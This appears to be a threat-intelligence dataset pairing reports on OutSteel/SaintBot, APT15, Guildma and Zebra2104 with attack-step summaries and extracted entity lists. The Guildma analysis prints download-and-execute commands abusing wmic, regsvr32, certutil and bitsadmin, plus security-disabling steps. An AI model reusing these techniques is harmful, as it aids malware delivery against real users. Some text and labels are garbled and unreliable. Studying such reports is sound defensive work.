transfer of file extensions (transferring files to the control server is required for the help of HTTP POST1/2requests).We swear on the need for additional monitoring of the connection with the public Discord service.Graphic imagesRice. 1 Butt of a swivel electronic sheetRice. 2 Application of the program code of the OutSteel program2/2 "," 1. The attackers send phishing emails posing as the National Health Service of Ukraine containing ZIP archives. 2. The ZIP archive contains: - Decoy document ""Addendum_2.docx"" - Shortcut file ""Addendum_1.docx.lnk"" 3. When executed, the shortcut file launches a PowerShell command. 4. The PowerShell command downloads and executes: - ""up74987340.exe"" which extracts ""up74987340.dec.exe"" (OutSteel malware) - ""load74h74830.exe"" which downloads ""1406.exe"" (SaintBot malware) 5. OutSteel exfiltrates specific file types from the victim's computer. 6. SaintBot can enable further compromise of the system. 7. The malware achieves persistence through registry and startup folder modifications. 8. The report also provides IOCs from the attack for further analysis. ",valid_55,"['the National Health Service of Ukraine', 'Shortcut file', 'launch', 'a PowerShell command', 'up74987340.exe', 'OutSteel', 'load74h74830.exe', 'SaintBot']",the National Health Service of Ukraine; Shortcut file; launch; a PowerShell command; up74987340.exe; OutSteel; load74h74830.exe; SaintBot.
"APT15 is alive and strong: An analysis of RoyalCli and RoyalDNS In May 2017, NCC Group's Incident Response team reacted to an ongoing incident where our client, which provides a range of services to UK Government, suﬀered a network compromise involving the advanced persistent threat group APT15.APT15 is also known as, Ke3chang, Mirage, Vixen Panda GREF and Playful Dragon.A number of sensitive documents were stolen by the attackers during the incident and we believe APT15 was targeting information related to UK government departments and military technology. APT15 expands its arsenal During our analysis of the compromise, we identiﬁed new backdoors that now appear to be part of APT15's toolset. The backdoor BS2005 - which has traditionally been used by the group - now appears alongside the additional backdoors RoyalCli and RoyalDNS. The RoyalCli backdoor appears to be an evolution of BS2005 and uses familiar encryption and encoding routines. The name RoyalCli was chosen by us due to a debugging path left in the binary:c:\users\wizard\documents\visual studio 2010\Projects\RoyalCli\Release\RoyalCli.pdbRoyalCli and BS2005 both communicate with the attacker's command and control (C2) through Internet Explorer (IE) by using the COM interface IWebBrowser2. Due to the nature of the technique, this results in C2 data being cached to disk by the IE process; we'll get to this later. Analysis of the domains and IP address infrastructure used by APT15 identiﬁed a number of similar possible domains, shown at the bottom of the post. These appeared to be hosted on either Linode or Google Cloud, with a preference for using the ASN AS63949. All of the backdoors identiﬁed - excluding RoyalDNS - required APT15 to create batch scripts in order to install its persistence mechanism. This was achieved through the use of a simple Windows run key. We believe that APT15 could have employed this technique in order toevade behavioural detection, rather than due to a lack of sophistication or development capability. Additional tools were recovered during the incident, including a network scanning/enumeration tool, the archiving tool WinRAR and a bespoke Microsoft SharePoint enumeration and data dumping tool, known as 'spwebmember'. spwebmember was written in Microsoft .NET and includes hardcoded values for client project names for data extraction. The tool would connect to the SQL SharePoint database and issue a query to dump all data from the database to a temporary ﬁle aﬃxed with 'spdata'. The group also used keyloggers and their own .NET tool to enumerate folders and dump data from Microsoft Exchange mailboxes. APT15 was also observed using Mimikatz to dump credentials and generate Kerberos golden tickets. This allowed the group to persist in the victim's network in the event of remediation actions being undertaken, such as a password reset. APT15 lives oﬀ the land Upon ejection from the network, APT15 managed to regain access a couple of weeks later via the corporate VPN solution with a stolen VPN certiﬁcate, which they had extracted from a compromised host. This time, APT15 opted for a DNS based backdoor: RoyalDNS. The persistence mechanism used by RoyalDNS was achieved through a service called 'Nwsapagent'. C2 of this backdoor was performed using the TXT record of the DNS protocol. C2 was communicating with the domain 'andspurs[.]com'. We mentioned earlier that due to the nature of the IE injection technique used by the HTTP- based backdoors, a number of C2 commands were cached to disk. We were able to recover these ﬁles and reverse engineer the encoding routine used by the backdoors in order to uncover the exact commands executed by the attacker. In total, we were able to recover more than 200 commands executed by the attacker against the compromised hosts and were able to gain a clear insight into the attacker's TTPs. Our decode scripts can be found on our Github page: url (url Analysis of the commands executed by APT15 reaﬃrmed the group's preference to 'live oﬀ the land'. They utilised Windows commands in order to enumerate and conduct reconnaissance activities such as tasklist.exe, ping.exe, netstat.exe, net.exe, systeminfo.exe, ipconﬁg.exe and bcp.exe. Lateral movement was conducted through by a combination of net command, mounting the C$ share of hosts and manually copying ﬁles to or from compromised hosts. APT15 then used a tool known as RemoteExec (similar to Microsoft's Psexec) in order to remotely execute batch scripts and binaries.During our analysis of the decoded attacker commands we noticed a typographical mistake, shown below in the folder name 'systme'. This indicates that a human operative was executing commands on a command line style interface, rather than an automated or GUI process.IOCs through the use of these backdoors. These, along with YARA signatures for the backdoors identiﬁed, can be found in the Github repository linked above. Domains The RoyalCli backdoor was attempting to communicate to the following domains:News.memozilla[.]org video.memozilla[.]orgThe BS2005 backdoor utilised the following domains for C2:Run.linodepower[.]com Singa.linodepower[.]com log.autocount[.]orgRoyalDNS backdoor was seen communicating to the domain:andspurs[.]comPossible linked APT15 domains include:Micakiz.wikaba[.]org dnsapp[.]infoPublished date: 10 March 2018Written by: Rob Smallridge(url By Service Cyber Security Risk Management & Governance Website Performance CareersFilter By Date 2018 (/uk/about-us/newsroom-and-events/blogs/?Year=2018)March (5) (/uk/about-us/newsroom-and-events/blogs/?Year=2018&Month=3) February (7) (/uk/about-us/newsroom-and-events/blogs/?Year=2018&Month=2) January (10) (/uk/about-us/newsroom-and-events/blogs/?Year=2018&Month=1)2017 (/uk/about-us/newsroom-and-events/blogs/?Year=2017) 2016 (/uk/about-us/newsroom-and-events/blogs/?Year=2016) 2015 (/uk/about-us/newsroom-and-events/blogs/?Year=2015) 2014 (/uk/about-us/newsroom-and-events/blogs/?Year=2014) 2013 (/uk/about-us/newsroom-and-events/blogs/?Year=2013) 2012 (/uk/about-us/newsroom-and-events/blogs/?Year=2012) 2011 (/uk/about-us/newsroom-and-events/blogs/?Year=2011) 2010 (/uk/about-us/newsroom-and-events/blogs/?Year=2010)Call us on: +44(0)161 820 6646 (tel:+441618206646)Newsroom & EventsIn the media (/uk/about-us/newsroom-and-events/in-the-media/) News (/uk/about-us/newsroom-and-events/news/) Press Releases (/uk/about-us/newsroom-and-events/press-releases/) Events (/uk/about-us/newsroom-and-events/events/) Blogs (/uk/about-us/newsroom-and-events/blogs/) About Us History (/uk/about-us/what-we-do/history/) Board & Senior Management (/uk/about-us/what-we-do/board-and-executive- committee/) Careers (/uk/about-us/careers/) Resources (/uk/about-us/resources/) Oﬃce Locations (/uk/about-us/what-we-do/oﬃce-locations/) ©2018 NCC Group. All rights reserved. Investor Relations Share Price (/uk/about-us/investor-relations/share-price/) Results & Presentations (/uk/about-us/investor-relations/results-and-presentations/) Stock Exchange Announcements (/uk/about-us/investor-relations/stock-exchange- Terms & Conditions (/uk/about-us/terms-and-conditions/) Privacy Policy (/uk/about-us/privacy-policy/) Cookie Policy (/uk/about-us/privacy-policy/cookie-policy/) Accessibility (/uk/about-us/accessibility/) Sitemap (/uk/sitemap/) Latest from @NCCGroupplc (url COOK, a provider of high-quality frozen meals, suspected that slow load times were negatively aﬀecting its business. Download our case study for an in-depth analysis on how NCC Group measured and improved the performance of COOK’s website url us/resources/cook-real-user-monitoring-case-study/?resources=Case+Studies … (url Reply (url Retweet (url (url Despite the fact #GDPR (url will be enforced from May 2018, many organisations remain unclear on the topic of breach notiﬁcation under #GDPR (url For best practice advice on how to communicate a personal data breach download our ebook now url breach-notiﬁcation-under-gdpr-how-to-communicate-a-personal-data-breach/? research=Whitepapers … (urlReply (url Retweet (url (url "," 1. APT15 gains initial access to network 2. Deploys RoyalCli, RoyalDNS, and BS2005 backdoors 3. Backdoors communicate with C&C servers to receive commands 4. APT15 uses Windows tools like net and ping for internal recon 5. Stolen VPN certificates utilized to regain access after remediation attempts 6. Backdoors continue communicating with C&C during intrusion ",valid_51,"['APT15', 'access', 'network', 'RoyalCli', 'RoyalDNS', 'BS2005', 'backdoors', 'commands', 'us', 'tool', 'ping', 'VPN']",APT15; access; network; RoyalCli; RoyalDNS; BS2005; backdoors; commands; us; tool; ping; VPN.
"3/14/2020Guildma: The Devil drives electric | WeLiveSecurityGuildma: The Devil drives electric welivesecurity.com/2020/03/05/guildma-devil-drives-electricMarch 5, 2020In this blogpost, we will examine Guildma (also known as Astaroth, a powerful demon), a highly prevalent Latin American banking trojan. This Brazil-targeting trojan, written in Delphi, boasts some innovative execution and attack techniques. We will describe the most recent version, highlighting the most notable changes made since the middle of 2019 when an avalanche of articles about Guildma was published in response to its largest campaign to date. Characteristics Guildma is a Latin American banking trojan that targets Brazil exclusively. Based on our telemetry — as well as the public attention it has received — we believe it to be the most impactful and advanced banking trojan in the region. Besides targeting ﬁnancial institutions, Guildma also attempts to steal credentials for email accounts, e‑shops and streaming services, and affects at least ten times as many victims as other Latin American banking trojans already described in this series. It uses innovative methods of execution and sophisticated attack techniques.Unlike the Latin American banking trojans we have described previously, Guildma does not store the fake pop-up windows it uses within the binary. Instead, the attack is orchestrated by its C&C server. This gives the authors greater ﬂexibility to react to countermeasures implemented by the targeted banks.Guildma implements the following backdoor functionalities:Taking screenshots Capturing keystrokes Emulating keyboard and mouse Blocking shortcuts (such as disabling Alt + F4 to make it harder to get rid of fake windows it may display) Downloading and executing ﬁles Restarting the machineGuildma is very modular. At the time of writing, it consists of 10 modules, not including distribution chain stages. The functionality of individual modules will be discussed later. Evolution of distribution chains Our telemetry indicates Guildma spreads exclusively through spam emails with malicious attachments. Here are a few examples from a campaign from the middle of November 2019.url The Devil drives electric | WeLiveSecurityFigure 1. Spam email example (translation: “Hello, please explain these photos to me. I’m waiting for yourexplanation!”)Figure 2. Spam email example (translation: “Dear member of consórcio, attached is the proof of bid no.75432.”)url The Devil drives electric | WeLiveSecurityFigure 3. Spam email example (translation: “Good morning, I am sending the proof of transfer – DOC.Citibank”)Figure 4. Spam email example. Fake invoice reminder stating that a payment is due the day after tomorrow andthat the payment may take up to 72 hours to be processed.One of the deﬁning characteristics of Guildma’s distribution chains is using tools already present on the system, often in new and unusual ways.url The Devil drives electric | WeLiveSecurityAnother characteristic is reusing techniques. New techniques are added every once in a while, but for the most part, the developers seem to simply reuse techniques from older versions.Figure 5. Distribution chain of Guildma in version 150Figure 5 shows the distribution chain for version 150, but the structure of Guildma’s distribution chains is very dynamic. For instance, in previous versions, the malicious LNK ﬁle shown in Figure 5 was not embedded in a ZIP archive, or an SFX RAR archive containing an MSI installer was used instead. Also, there used to be another JScript stage whose sole purpose was downloading and executing the ﬁnal JScript stage; there have been too many changes overall to ﬁt into this article. In fact, the only part that has mostly stayed the same is the ﬁnal JScript stage.Using data from our long-term, in-depth tracking of this family, we have compiled a very good picture of Guildma’s activity.Figure 6 shows all ESET detections of Guildma’s ﬁrst-stage component. As you can see, the campaigns were ramping up slowly until a massive campaign in August 2019, when we were seeing up to 50,000 samples per day. This campaign went on for almost two months and accounted for more than double the amount of detections we had seen in the 10 months prior.Figure 6. First stage Guildma detections since October 2018Following is a summary of some of the more interesting techniques used in the last 14 months. Execution of the JScript stageurl The Devil drives electric | WeLiveSecurityOver the last year, Guildma has used several methods of executing the JScript stages of its distribution chain. At the end of 2018, Guildma was hiding its code in eXtensible Stylesheet Language (.xsl) ﬁles and using wmic.exe to download and execute them:wmic.exe <wmic query> /format:”<URL>”It then brieﬂy moved on to using regsvr32.exe and scrobj.dll to download a JScript-implemented COM object and execute its registration routine (which contained the malicious code):regsvr32.exe /s /n /u /i:<URL> scrobj.dllMost recently, the authors started abusing Windows Explorer to execute the JScript stage. This attack relies on the fact that Windows Explorer will try to open any ﬁle passed to it on the command line with its associated program and the fact that the default association for .js ﬁles is the Microsoft Windows Script Host. The “script” passed to Windows Explorer is a single command whose purpose is to download and execute the actual JScript stage:echo GetObject(‘script:<URL>’) > <ﬁle>.js | explorer.exe <random switches> <ﬁle>.js Execution of the binary modules Methods of running the PE modules are no less diverse.When we started tracking Guildma, it was abusing Avast’s aswRunDll.exe to launch the ﬁrst binary stage, with regsvr32.exe as a failover for computers where Avast’s products weren’t installed. The use of aswRunDll.exe was then dropped, leaving regsvr32.exe as the sole method of execution. After a brief period of using rundll32.exe, Guildma switched to its current execution method — ExtExport.exe.ExtExport.exe is an undocumented component of Microsoft Internet Explorer used for exporting bookmarks from Mozilla Firefox and 360 Secure Browser, and can be abused for DLL Side- Loading. When the following command is executed, mozcrt19.dll, mozsqlite3.dll, and sqlite3.dll are loaded from the folder speciﬁed on the command line:C:\Program Files\Internet Explorer\ExtExport.exe <folder> <dummy 1> <dummy 2>To abuse this, you would normally drop the DLL to be loaded as one of the above-mentioned ﬁles; Guildma uses all three. Downloading the binary modules Guildma has also utilized a couple of different ways to download the binary modules. The ﬁrst version was using certutil.exe copied to certis.exe (presumably to evade detection):certis.exe -urlcache -split -f “<URL>” “<destination path>”The authors then switched to BITSAdmin — the Microsoft Background Intelligent Transfer Service management tool — and are still using it at the time of writing:bitsadmin.exe /transfer <random number> /priority foreground <URL> <destination>url The Devil drives electric | WeLiveSecurityFor a couple months, the binary modules were base64-encoded and hosted on Google Cloud. In that time, Guildma was using both BITSAdmin and certutil — BITSAdmin to download the modules and certutil to decode them. Other changes Guildma uses strange, non-descriptive variable and function names. When we started tracking Guildma, the names, while nonsensical, were clearly man-made (e.g. “radador” for the random number function or “Bxaki” for the download function). In June 2019 they were all changed to random-looking names (e.g. “bx021” and “mrc430”). At ﬁrst, we thought the authors implemented some kind of an automated script obfuscator, but it turned out to be a onetime change and the names have remained the same since.A relatively new addition is the age-old technique of using ADS (Alternate Data Streams) to store the binary modules. All the modules are now stored as ADS of a single ﬁle (e.g. “desktop.ini:nauwuygiaa.jpg”, “desktop.ini:nauwuygiab.jpg”, etc.). Version history Guildma has seemingly gone through many versions during its development, but there was usually very little development between versions — due to its clunky architecture utilizing hardcoded conﬁguration values, for the most part the authors have to recompile all the binaries for every new campaign. A job that is clearly not completely automated, since there has often been a signiﬁcant delay between updating the version number in the scripts and in the binaries.In this article, we cover version 150, but since we started writing, two more versions have been released. They contain no substantial change in functionality or distribution, supporting our claims about Guildma’s development cycle.The ﬁnal stage of the distribution chain used to contain a version name (and even before that, it used to download said name along with the binary modules), but it has been (presumably) permanently replaced with a simple “xXx” since version 148.Table 1 summarizes all the versions released since we started tracking Guildma actively in October 2018. Looking at the version strings, we get the feeling the author is passionate about ecology and fast cars.Table 1. Guildma version historyVersion number Version nameFirst seen 2018-09-18 131 2018-10-31 132 2018-11-28 133 2018-11-29 134Version preﬁx 134_MAXX_TESLAsdwqiopawsamazonurl The Devil drives electric | WeLiveSecurityVersion number Version nameFirst seen 2018-12-03 135 2018-12-13 136 2019-02-06 137 2019-03-21 138 2019-05-20 139 2019-06-03 140 2019-06-24 141 2019-07-17 142 2019-08-09 143 2019-08-26 144 2019-09-26 145 2019-10-16 146 2019-11-04 147 2019-11-19 148 2019-11-22 149 2019-12-13 150 2020-01-14 151 2020-02-05 152Version preﬁx As mentioned earlier, Guildma is very modular; the structure of its modules seems to be mostly constant. In this section, we will brieﬂy describe the functionality of each module.All module names are composed of a shared, version-dependent preﬁx and a module-speciﬁc sufﬁx. In Table 2, the version-dependent preﬁx is andrealfo.Table 2. Guildma module overviewURL ﬁlename andrealfohh1a.dll.zip andrealfo64.~Filesystem ﬁlenameModule Main module loader 1 (part 1)url The Devil drives electric | WeLiveSecurityURL ﬁlename andrealfohh1b.dll.zip andrealfoxa.gif.zip andrealfoxb.gif.zip andrealfoxc.gif.zip andrealfogx.gif.zip andrealfog.gif.zip andrealfoc.jpg.zipFilesystem wwn.gif.zip andrealfodx.gif.zip andrealfoa.jpg.zip andrealfob.jpg.zip andrealfoi.gif.zipandrealfodwwn.gifandrealfodx.gif Main module loader 1 (part 2) Main module injector (part 1) Main module injector (part 2) Main module injector (part 3) Main module loader 2 Main module Contacts stealer and form grabber module RAT module (DLL)RAT module (EXE) JScript dropper moduleWith the exception of the main module loader 1 (*64.~) and the main module injector (*xa.gif, *xb.gif and *xc.gif), all the modules are encrypted with a simple XOR cipher using a repeating 32- byte key. The key is generated from a 32-bit seed using the algorithm shown in Figure 7. The seed value is obfuscated in the binaries to prevent simple extraction (see Figure 8).1 for i in range ( 32 ): key . append ( seed & 0xff ); seed >>= 1;Figure 7. Key generation algorithmurl The Devil drives electric | WeLiveSecurityFigure 8. Seed obfuscation in the binaryThree modules communicate with a C&C server: Main module, RAT module, and Contacts stealer and form grabber. The communication is done over HTTP(S) using a combination of base64 and various simple custom encryption algorithms to protect the data being transferred.In the next section, we describe how the C&C server address is obtained. Main module loader 1 (*64.~) This is the ﬁrst binary stage of the chain. The ﬁle is a DLL downloaded in two parts, which are concatenated by the previous JScript stage. It loads the three ﬁles comprising the next stage loader (*xa.gif, *xb.gif and *xc.gif), concatenates them, maps the resulting PE ﬁle into its own address space and executes it.Loading a PE ﬁle is a relatively complex process, so the authors used the BTMemoryModule open-source library for this purpose. Main module injector (*xa.gif + *xb.gif + *xc.gif) This module loads the next stage (*gx.gif) from disk and decrypts it. It then runs the ﬁrst existing executable from the following list and injects the decrypted payload into it.C:\Program Files\AVAST Software\Avast\aswRunDll.exe C:\Program Files\Diebold\Warsaw\unins000.exe * C:\Windows\SysWOW64\userinit.exe C:\Windows\System32\userinit.exeAn application, popular in Brazil, to protect access to online banking. * Main module loader 2 (*gx.gif) The last loader stage is very simple and seems to needlessly duplicate the functionality of main module loader 1. It loads and decrypts the main module (*g.gif), maps it into its own memory space and executes it. Main module (*g.gif)url The Devil drives electric | WeLiveSecurityGuildma’s main module orchestrates all the remaining modules. Its implementation is deceptively complex, using countless timers and events, but its functionality is actually relatively simple. It contains legacy code that is not being used anymore as well as pre-production code that is not being used yet.On loading, this module checks if it is running in a sandboxed environment (for example, by examining the computer name and system disk volume ID), if there are other running instances of itself (based on window names) and if the system locale is different from Portuguese. If any check reveals the system is uninteresting or already compromised by Guildma, the malware terminates.Otherwise, the module then collects information from the system (computer name, which security software is being used, installed programs…) and establishes contact with the C&C server. It then starts monitoring interesting events, mainly when certain applications are launched or online banking sites opened, and executing appropriate actions (e.g. taking screenshots, preventing the user from closing the window by intercepting keyboard shortcuts, launching the RAT module, and so on).The module also implements backdoor commands whose functionality largely overlaps with the RAT module. Contact stealer and form grabber (*c.jpg) This module has two functions — gathering email addresses and form data from webpages.Email addresses are obtained from desktop email clients (such as Microsoft Outlook, Thunderbird and The Bat!) by parsing their address books as well as the emails themselves.The form grabber uses Windows COM technology to interact with Internet Explorer. It waits until a targeted site is opened (mostly Brazilian webmails, e-shops and payment gateways) and then logs the user out, forcing the victim to input credentials. It then retrieves the DOM and looks for important input ﬁeld values (such as usernames, passwords and credit card numbers). RAT module (*dwwn.gif, *dx.gif) The RAT module comes in two functionally identical compilations — DLL (*dwwn.gif) and EXE (*.dx.gif).It implements download and execute functionality, can take screenshots, emulate keyboard and mouse input, and restart the computer.Most Latin American banking trojans display fake pop-up windows based on monitoring the active window’s name. These windows are usually stored in the binary. We have not found such code in Guildma, but the RAT module contains a Delphi form implementing a simple web browser. Since it is also executed based on the active window’s name, we believe this form is used for displaying fake dialogs to the user. MailPassView (*a.jpg) and BrowserPassView (*b.jpg)url The Devil drives electric | WeLiveSecurityThese are freeware tools from Nirsoft for extracting saved credentials from popular email clients and web browsers respectively. Since Nirsoft has removed support for quiet operation (output to ﬁle, with no GUI) from newer versions to curb the abuse of these tools by malware, Guildma’s authors are using older versions that had those features. The same tools are also leveraged by Mispadu, except Mispadu is using newer versions with quiet operation support patched back in. JScript dropper module (*i.gif) This module drops and executes (using cscript.exe) a JScript ﬁle. The script consists of two parts — the ﬁrst part is stored as one long encrypted string, while the second part is assembled from many short strings (some encrypted and some in plaintext). Worthy of note is the fact that strings in the dropped JScript ﬁle are encrypted by this dropper module with a randomly generated key, so they are present in the clear in the dropper.The script executes the following actions:Disables UAC Disables EXE signature checking Disables Windows Defender Creates a ﬁrewall rule disabling network access for C:\Program Files\AVAST Software\Avast\Setup\avast.setup Disables wsddntf driver (Diebold Warsaw GAS Tecnologia — the banking access protection software introduced earlier) Adds a ﬁrewall exception for ﬁles used as injection targetsC:\Program Files\Diebold\Warsaw\unins000.exe C:\Program Files\AVAST Software\Avast\aswRunDll.exeWe believe this module may still be in development as we have never observed it on our test machines dropping the script. New developments (since mid-2019)New C&C retrieval In version 142, a new way of distributing C&C servers, abusing YouTube and Facebook proﬁles, was implemented. However, the authors stopped using Facebook almost immediately and, at the time of writing, are fully relying on YouTube. This is similar to Casbaneiro, but a bit cruder. While Casbaneiro was hiding the data in video descriptions and obfuscating it as a part of a URL, Guildma simply places the data in the channel description. The start and end of the encrypted C&C addresses is delimited by “|||”. The data in between is base64 encoded and encrypted using Mispadu’s string encryption algorithm. This is now the primary method of retrieving C&C servers; the old method (described by Avast) is still present as a backup.url The Devil drives electric | WeLiveSecurityFigure 9. Encrypted Guildma C&C server domains stored on YouTubeModules added and removed The previously described JScript dropper module was added in version 145. Conversely, in version 139, Guildma dropped two other modules present in older versions — mass mailer (*f.jpg) and its loader (*e.jpg). In the next few versions, these modules were still accessible under the expected names (<version preﬁx>e.jpg and <version preﬁx>f.jpg) from the same server as the other modules. This leads us to believe these modules are still being developed, but are now only distributed as needed, presumably using the download and execute backdoor command. New string encryption The JScript dropper module brought with it a new string encryption algorithm. A variant of this algorithm (shown in Figure 10) was propagated into other modules in version 147.url The Devil drives electric | WeLiveSecuritydef decrypt ( ct, key ): # stage 1 ct = unhexlify ( ct ); last = ct [ 0 ]; s = bytearray ( ct [ 1 : ] ); for i in range ( len ( s ) ): x = s [ i ] ^ key [ i % len ( key ) ]; if last > x: last = s [ i ]; s [ i ] = x; # stage 2 - reverse string s = s [::-1]; # stage 3 - c = not ( c - 10 ) s = """" . join ( [ chr ( ( ~( c - 10 ) ) & 0xff ) for c in s ] ); # stage 4 - Base25 decode and key subtraction k = ord ( s [ 0 ] ) - 65; ot = """"; for i in range ( 1, len ( s ), 2 ): ot += chr ( ( ord ( s [ i ] ) - 65 ) * 25 + ord ( s [ i + 1 ] ) - 65 - k - 100 ); return ot;1 26Figure 10. New string encryption algorithmurl The Devil drives electric | WeLiveSecurityOriginally, Guildma was using the same string encryption as Casbaneiro. The new algorithm has four stages and as you can see, the original string encryption algorithm is still used as the ﬁrst stage. Also of note is the fact that the fourth stage is once again using Mispadu’s encryption algorithm.In version 148 Guildma implemented a string table; all strings are decrypted at the beginning of execution and accessed from the table when needed. Removal of international targets In version 138, Guildma added capability to target institutions (mainly banks) outside of Brazil. Despite that, we have observed no international campaigns; the campaigns hosting ﬁles on Cloudﬂare Workers’ infrastructure even went as far as to block any downloads from non-Brazilian IPs. In fact, in the last 14 months we haven’t seen any campaign targeting users outside of Brazil.Finally, in version 145, the capability to target institutions outside of Brazil was removed. Based on these facts, we believe it was merely an in-development feature which ended up being In this part of the series, we have talked about Guildma, the most prevalent Latin American banking trojan we have seen. We have shown its rich historical developments while focusing on the most recent variant.Guildma once again shares the prevailing characteristics of a Latin American banking trojan. It is written in Delphi, targets the region, implements backdoor functionality, splits its functionality into many modules and abuses legitimate tools.Guildma also shares interesting common features with families described earlier in this series. Namely, its current encryption algorithm combines the ones used by Casbaneiro and Mispadu.For any inquiries, contact us at threatintel@eset.com. Indicators of Compromise can also be found in our GitHub repository. Indicators of Compromise (IoCs)HashesSHA-1 Main module loader 1injectorESET Detection name Win32/Spy.Guild‐ ma.BM Win32/Spy.Guild‐ ma.BJurl The Devil drives electric | WeLiveSecuritySHA-1 er and form Win32/Spy.Guild‐ ma.Q Win32/Spy.Guild‐ ma.BS Win32/Spy.Guild‐ C:\Users\Public\Libraries\qlanl\* Startup link LocationWin32/Spy.Guild‐ ma.BR Win32/Spy.Guild‐ ma.BR(DLL) MailPassView Win32/PSWTool.‐ MailPassView.E Win32/PSWTool.W Win32/Spy.Guild‐ module%APPDATA%\Microsoft\Programs\StartUp\reiast%USERNAME%%COMPUTERNAME%.lnkTargetsC:\Program Files (x86)\Internet Explorer\ExtExport.exe C:\Program Files\Internet Explorer\ExtExport.exeArgs<install dir> <rand> <rand> (where <rand> is a random, 5 to 9 character long string generated from the alphabet qwertyuiop1lgfdsas2dfghj3zcvbnmm) C&C serversurl The Devil drives electric | WeLiveSecurityurl url url url url url url url url url url url url ATT&CK techniquesNameTactic ID tionT1060 Registry Run T1197 BITS Jobs T1089 Disabling Se‐curity ToolsT1140 Deobfuscate/ T1073 DLL Side-LoadingT1096 NTFS File AttributesDescription Guildma distribution chains start with a malicious email attachment.Guildma utilizes rundll32.exe to execute its binary modules. Guildma abuses WMIC.exe to execute some of its distribution chain stages.Guildma ensures persistence by creating a LNK ﬁle in the %STARTUP% folder.BITSAdmin.exe is used to download binary modules. Guildma disables Windows Defender.The majority of Guildma modules need to be decrypt‐ ed after downloading.Guildma abuses ExtExport.exe for DLL Side-Loading.Guildma utilizes ADS to hide its modules on disk.url The Devil drives electric | WeLiveSecurityTactic IDNameT1055 Process Injection T1064 ScriptingT1220 XSL Script ProcessingT1081 Credentials inFilesT1214 Credentials inRegistryT1083 File and Di‐ DiscoveryT1063 Security Soft‐ware DiscoveryT1082 System Infor‐mation DiscoveryT1497 Virtualization/Sandbox ic ProtocolT1041 Exﬁltration Guildma utilizes process injection when executing its modules. Guildma implements its distribution chain stages in various scripting languages (mainly JScript). Guildma utilizes XSL script(s) in its distribution chains. Guildma extracts credentials stored by web browsers and email clients in ﬁles. Guildma extracts credentials stored by web browsers and email clients in Windows Registry. Guildma uses presence of certain ﬁles to determine whether banking and security tools are installed.Guildma uses window discovery to ﬁnd and terminate older versions of itself and to detect when interesting programs (e.g. banking applications or web browsers) are running. Guildma detects the presence of several security products.Guildma collects OS version and bitness, computer name and system locale.Guildma uses directory names, computer names, vol‐ ume IDs, and existence of named objects to detect sandboxes and virtualized environments. Guildma is capable of taking screenshots.New C&C addresses are encrypted using custom en‐ cryption algorithms.Guildma uploads screenshots and log ﬁles to the C&C server.url The Devil drives electric | WeLiveSecurityESET Research 5 Mar 2020 - 11:30AMurl ",1. Spam emails with malicious attachments are sent to victims. 2. Attachments contain scripts that download and execute the next stage JScript payload. 3. JScript stages use innovative techniques like abusing Windows Explorer to run. 4. Binary modules are downloaded using BITSAdmin or CertUtil. 5. Modules are injected into running processes using process injection. 6. Main module runs checks for sandbox and gathers system info. 7. C&C servers are retrieved from encrypted YouTube descriptions. 8. Interesting events are monitored like banking sites opening. 9. Actions like screenshots and keylogging are taken. 10. Credentials are extracted from files and registry. 11. Additional modules can be downloaded and executed. 12. Data is exfiltrated to C&C server. ,valid_49,"['spam emails', 'malicious attachments', 'victims', 'scripts', 'EXE', 'the next stage', 'JScript stages', 'techniques', 'Windows Explorer', 'binary modules', 'BITSAdmin', 'CertUtil', 'process injection', 'Main module', 'checks', 'sandbox', 'system info', 'C&C servers', 'YouTube', 'interesting events', 'banking sites', 'PE', 'Actions', 'screenshots', 'key', '10', 'credentials', 'files', 'registry', '11', '12', 'data', 'RAT']",spam emails; malicious attachments; victims; scripts; EXE; the next stage; JScript stages; techniques; Windows Explorer; binary modules; BITSAdmin; CertUtil; process injection; Main module; checks; sandbox; system info; C&C servers; YouTube; interesting events; banking sites; PE; Actions; screenshots; key; 10; credentials; files; registry; 11; 12; data; RAT.
"Hunter Becomes Hunted: Zebra2104 Hides a Herd of Malwareblogs.blackberry.com/en/2021/11/zebra2104Executive SummaryThe BlackBerry Research & Intelligence Team has uncovered an unusual connection between the actions of three distinct threat groups, including those behind financially-motivated ransomware such as MountLocker and Phobos, as well as the espionage-related advanced persistent threat (APT) group known as StrongPity. While it might seem implausible for criminal groups to be sharing resources, we found these groups had a connection that is enabled by a fourth; a threat actor we have dubbed Zebra2104, which we believe to be an Initial Access Broker (IAB).In this post, we will discuss what led us to these findings, what an IAB is, and how each piece fits into the puzzle. Once we look at each piece in context, we can better assess the full ramifications of these discoveries, and project what is yet to come.IntroductionWhen conducting research for our book, “Finding Beacons in the Dark: A Guide to Cyber Threat Intelligence,” we stumbled upon a domain that piqued our interest due to its similarity to a naming convention that we’d seen in a previous threat hunt.1/24This single domain led us down a path where we would uncover multiple ransomware attacks, and an APT command-and-control (C2). The path also revealed what we believe to be the infrastructure of an IAB: Zebra2104.IABs typically first gain entry into a victim’s network, then sell that access to the highest bidder on underground forums located in the dark web. Later, the winning bidder will often deploy ransomware and/or other financially motivated malware within the victim’s organization, depending on the objectives of their campaign.This discovery presented a great opportunity for us to understand the attribution of IABs. Performing intelligence correlation can help us build a clearer picture of how these disparate threat groups create partnerships and share resources to further enhance their nefarious goals.As we delved into and peeled off each overlapping layer throughout our investigation, it appeared at times that we were merely scratching the surface of such collaborations. There is undoubtedly a veritable cornucopia of threat groups working in cahoots, far beyond those mentioned in this blog.In this first installment, we will document the tip of this iceberg. A more comprehensive set of findings will come in a follow-up piece in the near future.Now, let’s explore what we found!It All Begins with Cobalt StrikeIn April of 2021, we observed the domain trashborting[.]com serving Cobalt Strike Beacons. We also identified multiple Beacons containing differing configuration data that was reaching out to this same domain, during April and August of this year.One such Beacon served from the IP 87.120.37[.]120 had trashborting[.]com specified as the C2 neighboring IP 87.120.37[.]119.These IP addresses had also hosted two domains with the .us Top Level Domain (TLD):lionarivv[.]us okergeeliw[.]usRediscovering Malicious Spam Infrastructure2/24Each of the aforementioned domains had a mail server and associated MX record, meaning they had the capability to send emails en masse. By examining the WHOIS information for these servers, we discovered that both domains were registered on 2020-09-12 by the email address georgesdesjardins285[at}xperi[.]link. By digging into the domain registrant information, we found that this email address had registered eight additional .us domains on the same date.These domains popped up previously in a Microsoft blog titled: “What tracking an attacker’s email infrastructure tells us about persistent cybercriminal operations.”The Microsoft 365 Defender Threat Intelligence Team found that these servers had been serving malspam that resulted in varying ransomware payloads, such as Dridex, which we were able to corroborate.TypeIOCDomain bertolinnj[.]usDomain eixirienhj[.]usDomain auswalzenna[.]usDomain megafonasgc[.]usDomain zensingergy[.]usDomain infuuslx[.]usDomain 